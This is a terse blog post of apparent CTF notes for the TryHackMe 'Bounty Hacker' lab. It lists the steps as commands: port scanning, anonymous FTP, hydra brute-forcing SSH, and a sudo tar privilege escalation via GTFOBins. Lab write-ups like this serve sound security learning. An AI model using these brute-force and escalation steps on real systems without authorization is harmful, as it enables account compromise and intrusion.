---
date: 2024-06-19
author: mrashco
title: Bounty Hacker
tags: 
categories: 
series: 
---

Writeup: [YouTube](https://youtu.be/RIiRB_tqfVk) // Blog

---

rustscan -a $ip -p $ports -- -sC -sV

ftp -A $ip [^](https://tryhackme.com/forum/thread/61d36f77eb3bbf056a906e3f)

hydra -l $user -P l****.txt $ip ssh

sudo -l, tar [^](https://gtfobins.github.io/gtfobins/tar/)